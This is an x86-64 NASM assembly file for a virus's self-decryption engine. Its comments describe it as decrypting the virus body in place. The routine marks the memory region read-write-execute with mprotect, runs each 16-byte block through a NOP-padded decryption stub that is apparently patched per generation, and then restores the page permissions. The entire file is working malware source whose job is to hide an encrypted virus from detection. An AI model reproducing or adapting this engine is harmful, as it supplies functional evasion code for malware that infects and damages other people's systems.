%include "include.asm.inc"
global decrypt_engine
global decrypt_engine.decryption_function
section .data
section .text



decrypt_engine:
;create stack frame
push rbp
mov  rbp, rsp
sub  rsp, 0x18
push rbx
push r12
push r13
push r14
push r15


mov [rbp-0x18], rdi ; rdi is start of encrypted section
mov [rbp-0x10], rsi ; rsi is size of section


call getpagesize
; rax has 0x1000
mov rcx, rax
; save rax for later use when passing to mprotect
sub rcx, 0x1
not rcx
mov rdi, rdi
and rdi, rcx
; AND them and the result will be stored in rcx
; rdi must hold the page_start address
; mov rsi, %2      ;rsi = end
mov r12, rdi
mov r13, rsi 
lea rsi, [rdi+rsi]      ;rsi = end
sub rsi,rdi      ;rsi = end - aligned_start = length

mov rdx, 0x7
; read+write+exec = 0x7
call mprotect


; source - destination registers hold the start and end of virus
; there is automatic calculation happening here which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
mov rsi, [rbp-0x18]
mov rdi, rsi
add rdi, [rbp-0x10]


.decryption_loop:
	; load first 16bytes of memory data to registers
	mov eax, [rsi]
	mov ebx, [rsi+0x4]
	mov ecx, [rsi+0x8]
	mov edx, [rsi+0xC]

.decryption_function:
	times FUNC_SIZE db OP_NOP
	; put back the data to where it was taken from
	mov [rsi], eax
	mov [rsi+0x4], ebx
	mov [rsi+0x8], ecx
	mov [rsi+0xC], edx
	add rsi, 0x10
	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
	cmp rsi, rdi
	;compare if rsi = rdi, signalling end of decryption
	jne .decryption_loop



mov rdi, r12
mov rsi, r13
mov edx, 0x3
call mprotect

xor rax,rax 
; this will ensure rax = 0 , means completed without error
pop r15
pop r14
pop r13
pop r12
pop rbx
mov rsp, rbp
pop rbp
ret